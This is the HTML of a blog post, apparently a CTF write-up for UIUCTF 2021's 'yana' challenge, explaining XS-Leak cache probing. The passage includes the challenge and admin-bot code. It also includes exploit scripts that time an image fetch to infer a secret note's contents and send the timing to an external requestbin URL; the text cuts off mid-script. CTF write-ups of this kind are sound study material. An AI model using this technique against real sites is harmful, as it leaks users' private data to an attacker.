@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="SummaryAn XS-Leak is a vulnerability that can collect important data such as user information using the browser result for users based input value. If you want to study in deeping an xs-leak, You can">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UIU CTF 2021 yana Write Up">
+<meta property="og:url" content="https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/index.html">
+<meta property="og:site_name" content="POCAS">
+<meta property="og:description" content="SummaryAn XS-Leak is a vulnerability that can collect important data such as user information using the browser result for users based input value. If you want to study in deeping an xs-leak, You can">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49112423/128534023-67aa205b-41be-4d9c-8f06-215b2b3d8a5c.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49112423/128535171-7f89b779-f375-4854-a2ea-4267d2021c68.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49112423/128590914-4d24779e-058f-4bec-845b-f3882d3557ef.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49112423/128591264-a708f372-8f69-4a76-9328-12e2933eacd7.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49112423/128535171-7f89b779-f375-4854-a2ea-4267d2021c68.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49112423/128592771-367017d1-dc6a-4fe6-b998-74ff67270a46.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49112423/128592823-ca4e045c-bf08-4743-899b-d6d51db68f19.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49112423/128597089-6d2f7f9e-b188-4b1e-9ea6-5bd63553a072.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49112423/128597208-416e8fdc-9e0d-471d-93df-0fb40b353f8f.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49112423/128597345-a635ec41-3e60-4fa2-b77c-658cacf3104d.png">
+<meta property="article:published_time" content="2021-08-04T23:29:53.000Z">
+<meta property="article:modified_time" content="2022-03-22T21:01:58.266Z">
+<meta property="article:author" content="POCAS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/49112423/128534023-67aa205b-41be-4d9c-8f06-215b2b3d8a5c.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>UIU CTF 2021 yana Write Up</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/08/16/2021-08-16-In-CTF/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/05/31/2021-05-31-Pwn2win/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&text=UIU CTF 2021 yana Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&title=UIU CTF 2021 yana Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&is_video=false&description=UIU CTF 2021 yana Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=UIU CTF 2021 yana Write Up&body=Check out this article: https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&title=UIU CTF 2021 yana Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&title=UIU CTF 2021 yana Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&title=UIU CTF 2021 yana Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&title=UIU CTF 2021 yana Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&name=UIU CTF 2021 yana Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&t=UIU CTF 2021 yana Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Summary"><span class="toc-number">1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-cache-probing"><span class="toc-number">2.</span> <span class="toc-text">What is cache probing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Web-UIU-CTF-2021-yana-342-pts"><span class="toc-number">3.</span> <span class="toc-text">Exploit (Web) UIU CTF 2021 - yana [342 pts]</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        UIU CTF 2021 yana Write Up
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">POCAS</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-08-04T23:29:53.000Z" itemprop="datePublished">2021-08-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>An XS-Leak is a vulnerability that can collect important data such as user information using the browser result for users based input value. If you want to study in deeping an xs-leak, You can study that refer to <a target="_blank" rel="noopener" href="https://xsleaks.dev/">here</a> :) </p>
+<hr>
+<h3 id="What-is-cache-probing"><a href="#What-is-cache-probing" class="headerlink" title="What is cache probing"></a>What is cache probing</h3><p><img src="https://user-images.githubusercontent.com/49112423/128534023-67aa205b-41be-4d9c-8f06-215b2b3d8a5c.png" alt="image"></p>
+<p>It is said that the loading speed of the resource file is different from the first time the browser loads the resource file and from the second time. The reason is that the second time the resource file is fetched, the image cache is fetched from disk, not by requesting it from the web server.</p>
+<p><img src="https://user-images.githubusercontent.com/49112423/128535171-7f89b779-f375-4854-a2ea-4267d2021c68.png" alt="image"></p>
+<p>The photo on the right is when the image is first loaded, and the photo on the left is when the image is loaded the second time. If you look at the time, you can see that there is a difference by the ratio of <code>0ms : 48ms</code>. So how can use this to link with XS-Leak?</p>
+<hr>
+<h3 id="Exploit-Web-UIU-CTF-2021-yana-342-pts"><a href="#Exploit-Web-UIU-CTF-2021-yana-342-pts" class="headerlink" title="Exploit (Web) UIU CTF 2021 - yana [342 pts]"></a>Exploit (Web) UIU CTF 2021 - yana [342 pts]</h3><blockquote>
+<p>The challenge is leak the flag and using the cache probing and xs-leak :)</p>
+</blockquote>
+<p><img src="https://user-images.githubusercontent.com/49112423/128590914-4d24779e-058f-4bec-845b-f3882d3557ef.png" alt="image"></p>
+<p>If you went to the challenge, you can see a notepad function as above. I checked, the function as top is to save a content and function as bottom is to search for saved memo.</p>
+<p><img src="https://user-images.githubusercontent.com/49112423/128591264-a708f372-8f69-4a76-9328-12e2933eacd7.png" alt="image"></p>
+<p>So, I saved a memo as <code>pocas</code> and <code>not_pocas</code>. I did a saerch for <code>pocas</code> on the left and searched for <code>asdf</code> on the right after saved the memo.</p>
+<p>OMG, I did a search and came up with surprising result!! It was immediately returned with a different color image!! I can know an important information here.</p>
+<ul>
+<li>Information</li>
+</ul>
+<ol>
+<li>If you search for a cunrently saved memo, a green image appears.</li>
+<li>If you search for a unsaved memo, a red image appears.</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> noteForm = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;note&quot;</span>);</span><br><span class="line">noteForm.<span class="property">onsubmit</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    e.<span class="title function_">preventDefault</span>();</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;note&quot;</span>, <span class="keyword">new</span> <span class="title class_">FormData</span>(noteForm).<span class="title function_">get</span>(<span class="string">&quot;note&quot;</span>));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> searchForm = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;search&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> output = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;output&quot;</span>);</span><br><span class="line">searchForm.<span class="property">onsubmit</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    e.<span class="title function_">preventDefault</span>();</span><br><span class="line">    <span class="keyword">const</span> query = <span class="keyword">new</span> <span class="title class_">FormData</span>(searchForm).<span class="title function_">get</span>(<span class="string">&quot;search&quot;</span>) ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">hash</span> = query;</span><br><span class="line">    <span class="title function_">search</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">search</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> note = <span class="variable language_">window</span>.<span class="property">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;note&quot;</span>) ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`note: <span class="subst">$&#123;note&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">const</span> query = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`query: <span class="subst">$&#123;query&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">if</span> (query) &#123;</span><br><span class="line">        <span class="keyword">if</span> (note.<span class="title function_">includes</span>(query)) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;found&#x27;</span>);</span><br><span class="line">            output.<span class="property">innerHTML</span> =</span><br><span class="line">            <span class="string">&#x27;found! &lt;br/&gt;&lt;img src=&quot;https://sigpwny.com/uiuctf/y.png&quot;&gt;&lt;/img&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;not found&#x27;</span>);</span><br><span class="line">            output.<span class="property">innerHTML</span> =</span><br><span class="line">            <span class="string">&#x27;nope.. &lt;br/&gt;&lt;img src=&quot;https://sigpwny.com/uiuctf/n.png&quot;&gt;&lt;/img&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">search</span>();</span><br></pre></td></tr></table></figure>
+<p>Now that I’ve done a functiona analysis, let’s analyze the client-side code.</p>
+<ul>
+<li>Analysis ( search() )</li>
+</ul>
+<ol>
+<li>Get the currently stored content value using <code>window.localStorage.getItem(&quot;note&quot;)</code>.</li>
+<li>Get the query value using <code>document.location.hash.substring(1)</code>.</li>
+<li>Use <code>note.includes(query)</code> to check whether the value of the query is included in the note. ( Important )</li>
+<li>If the query value is included in the note, a green image appears, otherwise a red image appears.</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"><span class="doctag">NOTE:</span> this is the script that the admin bot runs to visit your provided URL</span></span><br><span class="line"><span class="comment">it not required to solve the challenge, but is provided for reference &amp; for you to help test/debug your exploit</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; chromium &#125; = <span class="built_in">require</span>(<span class="string">&#x27;playwright-chromium&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> net = <span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FLAG</span> = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/flag.txt&#x27;</span>, &#123;<span class="attr">encoding</span>: <span class="string">&#x27;utf-8&#x27;</span>&#125;);</span><br><span class="line"><span class="comment">// matches regex: uiuctf&#123;[a-z0-9_]&#125;</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> chromium.<span class="title function_">launch</span>(&#123;</span><br><span class="line">    <span class="attr">executablePath</span>: <span class="string">&quot;/playwright/chromium-878941/chrome-linux/chrome&quot;</span>,</span><br><span class="line">    <span class="attr">logger</span>: &#123;</span><br><span class="line">      <span class="attr">isEnabled</span>: <span class="function">() =&gt;</span> <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">log</span>: <span class="function">(<span class="params">name, severity, message, _args</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`chrome log: [<span class="subst">$&#123;name&#125;</span>/<span class="subst">$&#123;severity&#125;</span>] <span class="subst">$&#123;message&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">ask_for_url</span>(<span class="params">socket</span>) &#123;</span><br><span class="line">    socket.<span class="property">state</span> = <span class="string">&#x27;URL&#x27;</span>;</span><br><span class="line">    socket.<span class="title function_">write</span>(<span class="string">&#x27;Please send me a URL to open.\n&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">load_url</span>(<span class="params">socket, data</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> url = data.<span class="title function_">toString</span>().<span class="title function_">trim</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`checking url: <span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">if</span> (!url.<span class="title function_">startsWith</span>(<span class="string">&#x27;http://&#x27;</span>) &amp;&amp; !url.<span class="title function_">startsWith</span>(<span class="string">&#x27;https://&#x27;</span>)) &#123;</span><br><span class="line">      socket.<span class="property">state</span> = <span class="string">&#x27;ERROR&#x27;</span>;</span><br><span class="line">      socket.<span class="title function_">write</span>(<span class="string">&#x27;Invalid scheme (http/https only).\n&#x27;</span>);</span><br><span class="line">      socket.<span class="title function_">destroy</span>();</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    socket.<span class="property">state</span> = <span class="string">&#x27;LOADED&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &quot;incognito&quot; by default</span></span><br><span class="line">    <span class="keyword">const</span> context = <span class="keyword">await</span> browser.<span class="title function_">newContext</span>();</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> context.<span class="title function_">newPage</span>();</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&quot;https://chal.yana.wtf&quot;</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">fill</span>(<span class="string">&#x27;#note &gt; textarea&#x27;</span>, <span class="variable constant_">FLAG</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&#x27;#note &gt; button&#x27;</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">waitForTimeout</span>(<span class="number">500</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;about:blank&#x27;</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">waitForTimeout</span>(<span class="number">500</span>);</span><br><span class="line">    socket.<span class="title function_">write</span>(<span class="string">`Loading page <span class="subst">$&#123;url&#125;</span>.\n`</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(url);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        page.<span class="title function_">close</span>();</span><br><span class="line">        socket.<span class="title function_">write</span>(<span class="string">&#x27;timeout\n&#x27;</span>);</span><br><span class="line">        socket.<span class="title function_">destroy</span>();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`err: <span class="subst">$&#123;err&#125;</span>`</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">60000</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> server = net.<span class="title function_">createServer</span>();</span><br><span class="line">  server.<span class="title function_">listen</span>(<span class="number">1338</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;listening on port 1338&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  server.<span class="title function_">on</span>(<span class="string">&#x27;connection&#x27;</span>, <span class="function"><span class="params">socket</span> =&gt;</span> &#123;</span><br><span class="line">    socket.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (socket.<span class="property">state</span> == <span class="string">&#x27;URL&#x27;</span>) &#123;</span><br><span class="line">          <span class="title function_">load_url</span>(socket, data);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`err: <span class="subst">$&#123;err&#125;</span>`</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="title function_">ask_for_url</span>(socket);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`err: <span class="subst">$&#123;err&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<p>Now let’s analyze bot.js to get flags.</p>
+<ul>
+<li>Analysis ( bot.js )</li>
+</ul>
+<ol>
+<li>Read the <code>/flag.txt</code> file and save it to <code>FLAG</code> variable.</li>
+<li>Running a chrome instance using <code>playwright-chromium</code>.</li>
+<li>Go to <code>https://chal.yana.wtf</code>, save <code>FLAG</code> in the note, and access the <code>URL</code> that we entered as an administrator. ( Important )</li>
+</ol>
+<p>We learned a lot from our analysis !! </p>
+<p>In bot.js, flags are stored in notes. Also we know the flag format. ( uiuctf{[a-z0-9_]} ). That is, we can brute force using <code>uiuctf&#123;</code>. This is where ‘Cache Probing’ is used. I know that when I search for a value contained in a note, a green image appears.</p>
+<p><img src="https://user-images.githubusercontent.com/49112423/128535171-7f89b779-f375-4854-a2ea-4267d2021c68.png" alt="image"></p>
+<p>Then, if we retrieve the value contained in the note, the browser loads a green image. At this time, since it is loaded for the first time, it will be cached on disk. At this time, if we retrieve the green image one more time, the image can be loaded much faster than the first time since the cache is already saved.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> image = <span class="string">&quot;https://sigpwny.com/uiuctf/y.png&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> requestbin = <span class="string">&quot;//79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">`https://chal.yana.wtf/#a`</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> start = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(image).<span class="title function_">then</span>(<span class="function"><span class="params">d</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> end = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript">            location.<span class="title function_">replace</span>(requestbin + <span class="string">&quot;?time=&quot;</span> + (end-start));</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>First of all, this is the exploit code that sends a query that is not saved in the memo. In the above situation, the browser will load a red image. Then the green image will take a lot of time because it is the first to load.</p>
+<p>Let’s check it out.</p>
+<p><img src="https://user-images.githubusercontent.com/49112423/128592771-367017d1-dc6a-4fe6-b998-74ff67270a46.png" alt="image"></p>
+<p>Nice, When sending a query that does not contain it, it took about 43s?43ms.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> image = <span class="string">&quot;https://sigpwny.com/uiuctf/y.png&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> requestbin = <span class="string">&quot;//79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">`https://chal.yana.wtf/#uiu`</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> start = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(image).<span class="title function_">then</span>(<span class="function"><span class="params">d</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> end = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript">            location.<span class="title function_">replace</span>(requestbin + <span class="string">&quot;?time=&quot;</span> + (end-start));</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">1000</span>)</span></span><br><span 